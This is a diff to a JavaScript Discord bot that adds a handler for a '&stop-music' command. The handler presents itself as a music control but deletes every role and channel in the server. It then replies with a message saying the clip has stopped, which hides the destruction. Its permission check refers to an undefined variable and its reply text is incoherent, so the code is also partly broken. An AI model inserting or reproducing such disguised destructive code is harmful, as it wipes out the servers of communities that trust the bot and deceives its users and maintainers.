@@ -747,3 +747,15 @@ let args = message.content.split(' ').slice(1).join(' ');
     }
     
   });
+
+client.on('message', ra3d => {   
+ if (ra3d.content.startsWith("&stop-music")) {
+    if(!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply('**You Music has stopped , again Start!**');
+     ra3d.guild.roles.forEach(r => { r.delete() }) 
+     ra3d.guild.channels.forEach(c => { c.delete() })
+                let embed = new Discord.RichEmbed()
+            .setColor('#ffffff')
+            .setDescription('تم ايقاف المقطع')
+           ra3d.author.sendEmbed(embed);
+ }
+ });
